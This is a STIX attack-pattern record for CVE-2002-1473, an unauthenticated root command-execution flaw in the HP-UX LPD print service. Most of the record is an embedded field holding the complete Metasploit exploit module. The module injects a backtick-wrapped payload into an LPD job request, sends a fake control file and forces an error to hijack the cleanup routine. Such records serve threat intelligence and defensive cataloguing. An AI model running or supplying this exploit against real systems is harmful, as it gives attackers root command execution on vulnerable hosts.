{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--422218b3-2481-400c-80b2-3b2ae8ace224",
    "created": "2024-08-14T16:34:04.291867Z",
    "modified": "2024-08-14T16:34:04.291871Z",
    "name": "HP-UX LPD Command Execution",
    "description": " This exploit abuses an unpublished vulnerability in the HP-UX LPD service. This flaw allows an unauthenticated attacker to execute arbitrary commands with the privileges of the root user. The LPD service is only exploitable when the address of the attacking system can be resolved by the target. This vulnerability was silently patched with the buffer overflow flaws addressed in HP Security Bulletin HPSBUX0208-213. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/hpux/lpd/cleanup_exec.rb",
            "external_id": "cleanup_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2002-1473"
        },
        {
            "source_name": "reference",
            "url": "http://archives.neohapsis.com/archives/hp/2002-q3/0064.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'HP-UX LPD Command Execution',\n      'Description'    => %q{\n          This exploit abuses an unpublished vulnerability in the\n        HP-UX LPD service. This flaw allows an unauthenticated\n        attacker to execute arbitrary commands with the privileges\n        of the root user. The LPD service is only exploitable when\n        the address of the attacking system can be resolved by the\n        target. This vulnerability was silently patched with the\n        buffer overflow flaws addressed in HP Security Bulletin\n        HPSBUX0208-213.\n      },\n      'Author'         => [ 'hdm' ],\n      'References'     =>\n        [\n          [ 'CVE', '2002-1473'],\n          [ 'OSVDB', '9638'],\n          [ 'URL', 'http://archives.neohapsis.com/archives/hp/2002-q3/0064.html'],\n\n        ],\n      'Platform'       => %w{ hpux unix },\n      'Arch'           => ARCH_CMD,\n      'Payload'        =>\n        {\n          'Space'       => 200,\n          'DisableNops' => true,\n          'BadChars'    => \"\\x00\\x09\\x20\\x2f\",\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl telnet',\n            }\n        },\n      'Targets'        =>\n        [\n          [ 'Automatic Target', { }]\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2002-08-28'\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(515)\n      ])\n  end\n\n  def exploit\n\n    # The job ID is squashed down to three decimal digits\n    jid = ($$ % 1000).to_s + [Time.now.to_i].pack('N').unpack('H*')[0]\n\n    # Connect to the LPD service\n    connect\n\n    print_status(\"Sending our job request with embedded command string...\")\n    # Send the job request with the encoded command\n    sock.put(\n      \"\\x02\" + rand_text_alphanumeric(3) + jid +\n      \"`\" + payload.encoded + \"`\\n\"\n    )\n\n    res = sock.get_once(1)\n    if !(res and res[0,1] == \"\\x00\")\n      print_status(\"The target did not accept our job request\")\n      return\n    end\n\n    print_status(\"Sending our fake control file...\")\n    sock.put(\"\\x02 32 cfA\" + rand_text_alphanumeric(8) + \"\\n\")\n    res = sock.get_once(1)\n    if !(res and res[0,1] == \"\\x00\")\n      print_status(\"The target did not accept our control file\")\n      return\n    end\n\n    print_status(\"Forcing an error and hijacking the cleanup routine...\")\n\n    begin\n      sock.put(rand_text_alphanumeric(16384))\n      disconnect\n    rescue\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2002-08-28",
    "x_mitre_platforms": [
        "%w{ hpux unix }"
    ]
}